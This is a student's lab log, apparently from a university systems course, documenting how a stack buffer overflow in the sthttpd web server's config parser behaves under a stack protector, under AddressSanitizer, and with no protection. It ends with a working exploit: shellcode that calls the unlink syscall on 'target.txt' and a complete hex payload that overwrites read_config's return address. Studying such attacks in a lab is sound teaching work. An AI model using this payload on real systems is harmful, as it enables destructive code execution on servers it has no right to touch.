@@ -1,0 +1,563 @@
+CS33 - Smashing Lab
+log.txt
+Feilan Wang
+104796844
+
+1.	Export PATH.
+	$ export PATH=/usr/local/cs/bin:$PATH
+	$ which gcc
+	outputs:
+	/usr/local/cs/bin/gcc
+
+2.	Build sthttpd with given patch. 
+	
+	a.	Download sthttpd 2.27.0.
+		$ wget http://web.cs.ucla.edu/classes/fall17/cs33/lab/sthttpd-2.27.0.tar.gz
+
+	b.	Unzip the downloaded file. 
+		$ tar -xvzf sthttpd-2.27.0.tar.gz
+
+	c.	Enter directory.
+		$ cd sthttpd-2.27.0/src
+
+	d.	Modified the two files as stated in the spec using emacs. 
+		$ emacs thttpd.c
+		$ emacs libhttpd.c
+
+	Configure it.
+		$ ./configure \
+   			LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+
+   	Compile it three times.
+
+   	a.	(SP) for strong stack protection:
+   		$ make clean
+   		$ make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+   		$ mv src/thttpd src/thttpd-sp
+
+   	b.	(AS) for address sanitization:
+   		$ make clean
+   		$ make CFLAGS='-g3 -O2 -fno-inline -fsanitize=address -static-libasan'
+   		//Note: at step 3,4, I encountered error wile loading shared libraries. After checking Piazza, I added -static-libasan.
+   		$ mv src/thttpd src/thttpd-as
+
+   	c.	(NO) for neither:
+   		$ make clean
+   		$ make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+   		$ mv src/thttpd src/thttpd-no
+
+3,4.Calculate port number.
+		SP: 12330+3*(104796844%293)+1 = 12691
+		AS: 12330+3*(104796844%293)+2 = 12692
+		NO: 12330+3*(104796844%293)+3 = 12693
+
+	Create a txt file (foo.txt) inside src for later usage.
+		$ cd src
+	 	$ emacs foo.txt
+	 	"""
+	 	This is	random message for testing.
+		It has no meaning at all.
+		The content of foo.txt doesn't affect result.
+		Peace yo.
+		"""
+
+	Run modified sthttpd deamons under GDB.
+		a.	Use GDB to compile.
+			$ gdb thttpd-sp
+			(gdb) r -p 1269(123) -D 
+		b.	Do not exit GDB. 
+			Open another terminal window.
+			Log into SEASnet.
+			$ curl http://localhost:12691/foo.txt
+			should output the content of foo.txt.
+		c.	Ctrl C to terminate the process in GDB.
+	Do the above step for SP, AS and NO.
+
+5.	To make SP crash, create a txt file (config.txt) which contains multiple key words that will crash the program.
+	a.	Write a c program to generate 100 words of keywords.
+		Keywords are found in thttpd.c line 1039 and after.
+		$ emacs generate.c
+		"""
+		#include <stdio.h>
+		int main(void) {
+			int i;
+			for (i = 0; i < 100; i++)
+				printf("port ");
+			return 0;
+		}
+		"""
+		$ chmod +x generate.c
+		$ gcc generate.c -o generate
+		$ ./generate > config.txt
+
+	b.	Crash the program in GDB.
+		$ gdb src/thttpd-sp
+		(gdb) r -p 12691 -D -C config.txt
+		
+		Outputs:
+
+		[Thread debugging using libthread_db enabled]
+		Using host libthread_db library "/lib64/libthread_db.so.1".
+		*** stack smashing detected ***: /w/home.15/class/classfei/Desktop/CS33/CS33LAB4/sthttpd-2.27.0/src/thttpd-sp terminated
+
+		Program received signal SIGSEGV, Segmentation fault.
+		0x00007ffff6daf118 in ?? () from /lib64/libgcc_s.so.1
+
+	c.	Use backtrace. 
+		(gdb) bt
+
+		Outputs:
+
+		#0  0x00007ffff6daf118 in ?? () from /lib64/libgcc_s.so.1
+		#1  0x00007ffff6db0019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+		#2  0x00007ffff76e5376 in backtrace () from /lib64/libc.so.6
+		#3  0x00007ffff764df64 in __libc_message () from /lib64/libc.so.6
+		#4  0x00007ffff76e8d87 in __fortify_fail () from /lib64/libc.so.6
+		#5  0x00007ffff76e8d50 in __stack_chk_fail () from /lib64/libc.so.6
+		#6  0x0000000000404edd in read_config (filename=<optimized out>) at thttpd.c:1190
+		#7  0x7562656400677562 in ?? ()
+		#8  0x0067756265640067 in ?? ()
+		#9  0x6564006775626564 in ?? ()
+		#10 0x7562656400677562 in ?? ()
+		#11 0x0067756265640067 in ?? ()
+		#12 0x6564006775626564 in ?? ()
+		#13 0x7562656400677562 in ?? ()
+		#14 0x0067756265640067 in ?? ()
+		#15 0x6564006775626564 in ?? ()
+		#16 0x7562656400677562 in ?? ()
+		#17 0x0067756265640067 in ?? ()
+		#18 0x6564006775626564 in ?? ()
+		#19 0x7562656400677562 in ?? ()
+		#20 0x0067756265640067 in ?? ()
+		#21 0x6564006775626564 in ?? ()
+		#22 0x7562656400677562 in ?? ()
+		#23 0x0067756265640067 in ?? ()
+		#24 0x6564006775626564 in ?? ()
+		#25 0x7562656400677562 in ?? ()
+		#26 0x0067756265640067 in ?? ()
+		#27 0x6564006775626564 in ?? ()
+		#28 0x7562656400677562 in ?? ()
+		#29 0x0067756265640067 in ?? ()
+		#30 0x6564006775626564 in ?? ()
+		#31 0x7562656400677562 in ?? ()
+		#32 0x0067756265640067 in ?? ()
+		#33 0x6564006775626564 in ?? ()
+		#34 0x7562656400677562 in ?? ()
+		#35 0x0067756265640067 in ?? ()
+		#36 0x6564006775626564 in ?? ()
+		#37 0x7562656400677562 in ?? ()
+		#38 0x0067756265640067 in ?? ()
+		#39 0x6564006775626564 in ?? ()
+		#40 0x7562656400677562 in ?? ()
+		#41 0x0067756265640067 in ?? ()
+		#42 0x6564006775626564 in ?? ()
+		#43 0x7562656400677562 in ?? ()
+		#44 0x0067756265640067 in ?? ()
+		#45 0x6564006775626564 in ?? ()
+		#46 0x7562656400677562 in ?? ()
+		#47 0x0067756265640067 in ?? ()
+		#48 0x6564006775626564 in ?? ()
+		#49 0x7562656400677562 in ?? ()
+		#50 0x0067756265640067 in ?? ()
+		#51 0x6564006775626564 in ?? ()
+		#52 0x7562656400677562 in ?? ()
+		#53 0x0067756265640067 in ?? ()
+		#54 0x6564006775626564 in ?? ()
+		#55 0x7562656400677562 in ?? ()
+		#56 0x0067756265640067 in ?? ()
+		#57 0x6564006775626564 in ?? ()
+		#58 0x7562656400677562 in ?? ()
+		#59 0x0067756265640067 in ?? ()
+		#60 0x6564006775626564 in ?? ()
+		#61 0x7562656400677562 in ?? ()
+		#62 0x0067756265640067 in ?? ()
+		#63 0x0000000000000000 in ?? ()
+
+	d.	Set a breakpoint at thttpd.c:1190.
+		(gdb) b thttpd.c:1190
+		(gdb) set disassemble-next-line on
+		(dgb) r -p 12691 -D -C config.txt
+
+		Outputs:
+
+		Breakpoint 1, read_config (filename=<optimized out>) at thttpd.c:1190
+		1190	    }
+		=> 0x0000000000404e10 <read_config+1120>:	48 8b 44 24 68	mov    0x68(%rsp),%rax
+		   0x0000000000404e15 <read_config+1125>:	64 48 33 04 25 28 00 00 00	xor    %fs:0x28,%rax
+		   0x0000000000404e1e <read_config+1134>:	0f 85 b4 00 00 00	jne    0x404ed8 <read_config+1320>
+		   0x0000000000404e24 <read_config+1140>:	48 83 c4 70	add    $0x70,%rsp
+		   0x0000000000404e28 <read_config+1144>:	5b	pop    %rbx
+		   0x0000000000404e29 <read_config+1145>:	5d	pop    %rbp
+		   0x0000000000404e2a <read_config+1146>:	41 5c	pop    %r12
+		   0x0000000000404e2c <read_config+1148>:	41 5d	pop    %r13
+		   0x0000000000404e2e <read_config+1150>:	41 5e	pop    %r14
+		   0x0000000000404e30 <read_config+1152>:	c3	retq   
+
+	e.	Use 'si' to step in. 
+		After three times, I run into the following output.
+
+		=> 0x0000000000404ed8 <read_config+1320>:	e8 a3 d5 ff ff	callq  0x402480 <__stack_chk_fail@plt>
+
+		0x0000000000402480 in __stack_chk_fail@plt ()
+		=> 0x0000000000402480 <__stack_chk_fail@plt+0>:	ff 25 72 2c 21 00	jmpq   *0x212c72(%rip)        # 0x6150f8 <__stack_chk_fail@got.plt>
+
+		0x0000000000402486 in __stack_chk_fail@plt ()
+		=> 0x0000000000402486 <__stack_chk_fail@plt+6>:	68 1c 00 00 00	pushq  $0x1c
+
+		0x000000000040248b in __stack_chk_fail@plt ()
+		=> 0x000000000040248b <__stack_chk_fail@plt+11>:	e9 20 fe ff ff	jmpq   0x4022b0
+
+		0x00000000004022b0 in ?? ()
+		=> 0x00000000004022b0:	ff 35 52 2d 21 00	pushq  0x212d52(%rip)        # 0x615008
+
+		The xor step just before jump compare the current canary value with the one previously stored, and because they are not identical, the next instruction will do a jump to 0x404ed8.
+		At this address, 0x402480 <__stack_chk_fail@plt> is being called, which stops the program. 
+
+	6.	Repeat step 5 for AS. 
+		$ gdb src/thttpd-as
+		(gdb) r -p 12692 -D -C config.txt
+
+		Outputs:
+
+		[Thread debugging using libthread_db enabled]
+		Using host libthread_db library "/lib64/libthread_db.so.1".
+		=================================================================
+		==37846==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffcc94 at pc 0x000000441de4 bp 0x7fffffffcbf0 sp 0x7fffffffc3a0
+		READ of size 601 at 0x7fffffffcc94 thread T0
+		
+		Program received signal SIGSEGV, Segmentation fault.
+		0x00007ffff7073118 in ?? () from /lib64/libgcc_s.so.1
+
+		(gdb) bt
+
+		Outputs:
+
+		#0  0x00007ffff7073118 in ?? () from /lib64/libgcc_s.so.1
+		#1  0x00007ffff7074019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+		#2  0x00000000004d1863 in __sanitizer::BufferedStackTrace::SlowUnwindStack (
+	    this=0x7fffffffaea0, pc=4464100, max_depth=<optimized out>)
+	    at ../../../../gcc-7.2.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:123
+		#3  0x0000000000419d7f in __asan::GetStackTraceWithPcBpAndContext (fast=false, 
+	    context=0x0, bp=140737488342000, pc=4464100, max_depth=256, stack=0x7fffffffaea0)
+	    at ../../../../gcc-7.2.0/libsanitizer/asan/asan_stack.h:50
+		#4  __asan::ErrorGeneric::Print (
+	    this=this@entry=0x980148 <__asan::ScopedInErrorReport::current_error_+8>)
+	    at ../../../../gcc-7.2.0/libsanitizer/asan/asan_errors.cc:482
+		#5  0x00000000004ccae8 in __asan::ErrorDescription::Print (
+	    this=0x980140 <__asan::ScopedInErrorReport::current_error_>)
+	    at ../../../../gcc-7.2.0/libsanitizer/asan/asan_errors.h:360
+		#6  __asan::ScopedInErrorReport::~ScopedInErrorReport (this=0x7fffffffb717, 
+	    __in_chrg=<optimized out>)
+	    at ../../../../gcc-7.2.0/libsanitizer/asan/asan_report.cc:167
+		#7  __asan::ReportGenericError (pc=4464100, bp=bp@entry=140737488342000, 
+	    sp=sp@entry=140737488339872, addr=addr@entry=140737488342164, 
+	    is_write=is_write@entry=false, access_size=access_size@entry=601, exp=0, 
+	    fatal=false) at ../../../../gcc-7.2.0/libsanitizer/asan/asan_report.cc:397
+		#8  0x0000000000441e03 in __interceptor_strchr (s=<optimized out>, c=<optimized out>)
+	    at ../../../../gcc-7.2.0/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:466
+		#9  0x00000000004feb58 in read_config (filename=<optimized out>) at thttpd.c:1018
+		#10 0x6564206775626564 in ?? ()
+		#11 0x7562656420677562 in ?? ()
+		#12 0x2067756265642067 in ?? ()
+		#13 0x6564206775626564 in ?? ()
+		#14 0x7562656420677562 in ?? ()
+		#15 0x2067756265642067 in ?? ()
+		#16 0x6564206775626564 in ?? ()
+		#17 0x7562656420677562 in ?? ()
+		#18 0x2067756265642067 in ?? ()
+		#19 0x6564206775626564 in ?? ()
+		#20 0x7562656420677562 in ?? ()
+		#21 0x2067756265642067 in ?? ()
+		#22 0x6564206775626564 in ?? ()
+		#23 0x7562656420677562 in ?? ()
+		#24 0x2067756265642067 in ?? ()
+		#25 0x6564206775626564 in ?? ()
+		#26 0x7562656420677562 in ?? ()
+		#27 0x2067756265642067 in ?? ()
+		#28 0x6564206775626564 in ?? ()
+		#29 0x7562656420677562 in ?? ()
+		#30 0x2067756265642067 in ?? ()
+		#31 0x6564206775626564 in ?? ()
+		#32 0x7562656420677562 in ?? ()
+		#33 0x2067756265642067 in ?? ()
+		#34 0x6564206775626564 in ?? ()
+		#35 0x7562656420677562 in ?? ()
+		#36 0x2067756265642067 in ?? ()
+		#37 0x6564206775626564 in ?? ()
+		#38 0x7562656420677562 in ?? ()
+		#39 0x2067756265642067 in ?? ()
+		#40 0x6564206775626564 in ?? ()
+		#41 0x7562656420677562 in ?? ()
+		#42 0x2067756265642067 in ?? ()
+		#43 0x6564206775626564 in ?? ()
+		#44 0x7562656420677562 in ?? ()
+		#45 0x2067756265642067 in ?? ()
+		#46 0x6564206775626564 in ?? ()
+		#47 0x7562656420677562 in ?? ()
+		#48 0x2067756265642067 in ?? ()
+		#49 0x6564206775626564 in ?? ()
+		#50 0x7562656420677562 in ?? ()
+		#51 0x2067756265642067 in ?? ()
+		#52 0x6564206775626564 in ?? ()
+		#53 0x7562656420677562 in ?? ()
+		#54 0x2067756265642067 in ?? ()
+		#55 0x6564206775626564 in ?? ()
+		#56 0x7562656420677562 in ?? ()
+		#57 0x2067756265642067 in ?? ()
+		#58 0x0000000000fc4c00 in __sanitizer::theDepot ()
+		#59 0x0000000000000002 in ?? ()
+		#60 0x00007fffffffcf70 in ?? ()
+		#61 0x0000000000000000 in ?? ()
+
+		Set a breakpoint at thttpd.c:1018.
+		(gdb) b thttpd.c:1018
+		(gdb) set disassemble-next-line on
+		(gdb) r -p 12692 -D -C config.txt
+
+		After a few 'si', 
+
+		Outputs:
+
+		0x00000000004feb53	1018		if ( ( cp = strchr( line, '#' ) ) != (char*) 0 )
+   		0x00000000004feb4b <read_config+171>:	be 23 00 00 00	mov    $0x23,%esi
+   		0x00000000004feb50 <read_config+176>:	4c 89 e7	mov    %r12,%rdi
+		=> 0x00000000004feb53 <read_config+179>:	e8 f8 34 f4 ff	callq  0x442050 <__interceptor_strchr(char const*, int)>
+   		0x00000000004feb58 <read_config+184>:	48 85 c0	test   %rax,%rax
+   		0x00000000004feb5b <read_config+187>:	74 23	je     0x4feb80 <read_config+224>
+		(gdb) 
+		__interceptor_strchr (
+		    s=s@entry=0x7fffffffcc30 "debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug
+		    debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug de"..., c=c@entry=35)
+		    at ../../../../gcc-7.2.0/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:459
+		459	../../../../gcc-7.2.0/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc: No such file or directory.
+
+		As we can see, after three 'si', program called the function 0x442050 <__interceptor_strchr(char const*, int)>, which is an error
+		detector for AddressSanitizer, and it will aborted the program when detected an error. 
+
+
+7.	Repeat step 5 to crash NO. 
+
+	(gdb) src/thttpd-no
+	(gdb) r -p 12693 -D -C src/config.txt
+
+	Outputs:
+
+	[Thread debugging using libthread_db enabled]
+	Using host libthread_db library "/lib64/libthread_db.so.1".
+
+	Program received signal SIGSEGV, Segmentation fault.
+	0x0000000000404c8c in read_config (filename=<optimized out>) at thttpd.c:1190
+	1190	    }
+
+	(gdb) bt
+
+	Outputs:
+
+	#0  0x0000000000404c8c in read_config (filename=<optimized out>) at thttpd.c:1190
+	#1  0x7562656400677562 in ?? ()
+	#2  0x0067756265640067 in ?? ()
+	#3  0x6564006775626564 in ?? ()
+	#4  0x7562656400677562 in ?? ()
+	#5  0x0067756265640067 in ?? ()
+	#6  0x6564006775626564 in ?? ()
+	#7  0x7562656400677562 in ?? ()
+	#8  0x0067756265640067 in ?? ()
+	#9  0x6564006775626564 in ?? ()
+	#10 0x7562656400677562 in ?? ()
+	#11 0x0067756265640067 in ?? ()
+	#12 0x6564006775626564 in ?? ()
+	#13 0x7562656400677562 in ?? ()
+	#14 0x0067756265640067 in ?? ()
+	#15 0x6564006775626564 in ?? ()
+	#16 0x7562656400677562 in ?? ()
+	#17 0x0067756265640067 in ?? ()
+	#18 0x6564006775626564 in ?? ()
+	#19 0x7562656400677562 in ?? ()
+	#20 0x0067756265640067 in ?? ()
+	#21 0x6564006775626564 in ?? ()
+	#22 0x7562656400677562 in ?? ()
+	#23 0x0067756265640067 in ?? ()
+	#24 0x6564006775626564 in ?? ()
+	#25 0x7562656400677562 in ?? ()
+	#26 0x0067756265640067 in ?? ()
+	#27 0x6564006775626564 in ?? ()
+	#28 0x7562656400677562 in ?? ()
+	#29 0x0067756265640067 in ?? ()
+	#30 0x6564006775626564 in ?? ()
+	#31 0x7562656400677562 in ?? ()
+	#32 0x0067756265640067 in ?? ()
+	#33 0x6564006775626564 in ?? ()
+	#34 0x7562656400677562 in ?? ()
+	#35 0x0067756265640067 in ?? ()
+	#36 0x6564006775626564 in ?? ()
+	#37 0x7562656400677562 in ?? ()
+	#38 0x0067756265640067 in ?? ()
+	#39 0x6564006775626564 in ?? ()
+	#40 0x7562656400677562 in ?? ()
+	#41 0x0067756265640067 in ?? ()
+	#42 0x6564006775626564 in ?? ()
+	#43 0x7562656400677562 in ?? ()
+	#44 0x0067756265640067 in ?? ()
+	#45 0x6564006775626564 in ?? ()
+	#46 0x7562656400677562 in ?? ()
+	#47 0x0067756265640067 in ?? ()
+	#48 0x6564006775626564 in ?? ()
+	#49 0x7562656400677562 in ?? ()
+	#50 0x0067756265640067 in ?? ()
+	#51 0x6564006775626564 in ?? ()
+	#52 0x7562656400677562 in ?? ()
+	#53 0x0067756265640067 in ?? ()
+	#54 0x6564006775626564 in ?? ()
+	#55 0x7562656400677562 in ?? ()
+	#56 0x0067756265640067 in ?? ()
+	#57 0x0000000000000000 in ?? ()
+
+	(gdb) b thttpd.c:1190
+	(gdb) set disassemble-next-line on
+	(gdb) r -p 12693 -D -C config.txt
+
+	Outputs:
+
+	0x0000000000404c8c	1190	    }
+   0x0000000000404c80 <read_config+1104>:	48 83 c4 70	add    $0x70,%rsp
+   0x0000000000404c84 <read_config+1108>:	5b	pop    %rbx
+   0x0000000000404c85 <read_config+1109>:	5d	pop    %rbp
+   0x0000000000404c86 <read_config+1110>:	41 5c	pop    %r12
+   0x0000000000404c88 <read_config+1112>:	41 5d	pop    %r13
+   0x0000000000404c8a <read_config+1114>:	41 5e	pop    %r14
+=> 0x0000000000404c8c <read_config+1116>:	c3	retq   
+
+	Program received signal SIGSEGV, Segmentation fault.
+	0x0000000000404c8c in read_config (filename=<optimized out>) at thttpd.c:1190
+	1190	    }
+   0x0000000000404c80 <read_config+1104>:	48 83 c4 70	add    $0x70,%rsp
+   0x0000000000404c84 <read_config+1108>:	5b	pop    %rbx
+   0x0000000000404c85 <read_config+1109>:	5d	pop    %rbp
+   0x0000000000404c86 <read_config+1110>:	41 5c	pop    %r12
+   0x0000000000404c88 <read_config+1112>:	41 5d	pop    %r13
+   0x0000000000404c8a <read_config+1114>:	41 5e	pop    %r14
+=> 0x0000000000404c8c <read_config+1116>:	c3	retq   
+
+	Program terminated with signal SIGSEGV, Segmentation fault.
+	The program no longer exists.
+
+	It looks like the return address is invalid. This might due to our config.txt changes the return address on the stack. 
+
+8.	Generate assenbly code for thttpd.c.
+	
+	$ ./configure \
+    	LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+    
+    $ make clean
+    $ make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
+    $ mv src/thttpd.o src/thttpd-sp.s
+
+    $ make clean
+    $ make CFLAGS='-S -O2 -fno-inline -fsanitize=address -static-libasan'
+    $ mv src/thttpd.o src/thttpd-as.s 
+
+    $ make clean
+    $ make CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
+    $ mv src/thttpd.o src/thttpd-no.s
+
+    Use Cyberduck to pull these files onto my PC desktop. 
+
+    -fstack-protector-strong adds canary to the stack and check frequently. If it changed, this indicates a stack overflow and the program will abort. 
+    However, there's no much difference between SP and NO for the code in handle_read.
+
+    -fsanitize=address enables AddressSanitizer. It detects memory errors and abort the program.
+
+9.	Firstly, I need to find the address of the return address of read_config and for the line buffer. 
+	
+	(gdb) b read_config
+	(gdb) r -p 12693 -D -C config.txt
+	(gdb) info f
+
+	Outputs:
+
+	Stack level 0, frame at 0x7fffffffce50:
+ 	rip = 0x404830 in read_config (thttpd.c:1000); saved rip = 0x40511f
+ 	called by frame at 0x7fffffffce90
+ 	source language c.
+ 	Arglist at 0x7fffffffce40, args: filename=0x7fffffffe419 "config.txt"
+ 	Locals at 0x7fffffffce40, Previous frame's sp is 0x7fffffffce50
+ 	Saved registers:
+  	rip at 0x7fffffffce48
+
+  	The return address is at rip == 0x7fffffffce48.
+
+  	(gdb) print &line
+
+  	Outputs:
+
+  	$1 = (char (*)[100]) 0x7fffffffcdb0
+
+  	These two addresses are 0x7fffffffce48 - 0x7fffffffcdb0 = 0x98 = decimal 152.
+  	Hence, we need 152 bytes of data to reach the return address.
+
+  	We need to find the hex value of target.txt file. 
+  	Doing so by writing a program.
+  	$ emacs find.c
+
+  	#include <stdio.h>
+  	int main(void) {
+  		char target[11] = "target.txt";
+  	}
+
+  	$ gcc -c find.c
+  	$ objdump -d find.o
+
+  	Outputs:
+
+  0000000000000000 <main>:
+   0:	55                   	push   %rbp
+   1:	48 89 e5             	mov    %rsp,%rbp
+   4:	48 b8 74 61 72 67 65 	movabs $0x742e746567726174,%rax
+   b:	74 2e 74 
+   e:	48 89 45 f5          	mov    %rax,-0xb(%rbp)
+  12:	66 c7 45 fd 78 74    	movw   $0x7478,-0x3(%rbp)
+  18:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
+  1c:	b8 00 00 00 00       	mov    $0x0,%eax
+  21:	5d                   	pop    %rbp
+  22:	c3                   	retq   
+
+  "target.txt" hex value: 74 61 72 67 65 74 2e 74 78 74 00
+	and we want to put it in front of the return address. 
+
+	0x7fffffffce48 - 11 - 5 = 0x7fffffffce38
+
+	And we want to find out the assembly code for the following so that we can change it:
+
+	$ emacs exploit.s
+
+	movq    $0x7fffffffce38, %rdi
+	movq    $0x57, %rax
+	syscall
+
+	$ gcc -c exploit.s
+	$ objdump -d exploit.o
+
+	Outputs:
+
+	0000000000000000 <.text>:
+   0:	48 bf 38 ce ff ff ff 	movabs $0x7fffffffce38,%rdi
+   7:	7f 00 00 
+   a:	48 c7 c0 57 00 00 00 	mov    $0x57,%rax
+  11:	0f 05                	syscall 
+
+  The hex value is: 48 bf 38 ce ff ff ff 7f 00 00 48 c7 c0 57 00 00 00 0f 05 (19 bytes).
+
+  So the hex code should be:
+
+00 00 00 48 bf 38 ce ff ff ff 7f 00 00 48 c7 
+c0 57 00 00 00 0f 05 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 74 61 72 67 
+65 74 2e 74 78 74 00 00 00 00 00 00 78 ce ff ff ff 7f 00 00
+
+And use a online hex2raw tool to do the conversion. 
